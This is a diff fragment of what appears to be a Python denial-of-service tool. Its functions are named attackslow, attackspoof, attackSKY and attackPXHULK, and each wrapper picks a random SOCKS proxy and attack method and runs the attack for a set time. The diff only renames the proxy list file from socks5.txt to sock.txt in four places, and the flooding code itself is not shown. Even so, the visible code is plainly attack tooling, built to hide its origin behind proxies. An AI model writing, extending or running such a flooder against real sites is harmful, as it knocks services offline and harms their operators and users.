@@ -707,7 +707,7 @@ def attackslow(url, timer, threads):
         
 def Launchslow(url, timer):
     socksCrawler()  
-    prox = open("./socks5.txt", 'r').read().split('\n')
+    prox = open("./sock.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
@@ -799,7 +799,7 @@ def attackspoof(url, timer, threads):
 
 def Launchspoof(url, timer):
     socksCrawler()  
-    prox = open("./socks5.txt", 'r').read().split('\n')
+    prox = open("./sock.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
@@ -837,7 +837,7 @@ def attackSKY(url, timer, threads):
 
 def LaunchSKY(url, timer):
     socksCrawler()  
-    prox = open("./socks5.txt", 'r').read().split('\n')
+    prox = open("./sock.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
@@ -875,7 +875,7 @@ def attackPXHULK(url, timer, threads):
 
 def LaunchPXHULK(url, timer):
     socksCrawler()  
-    prox = open("./socks5.txt", 'r').read().split('\n')
+    prox = open("./sock.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
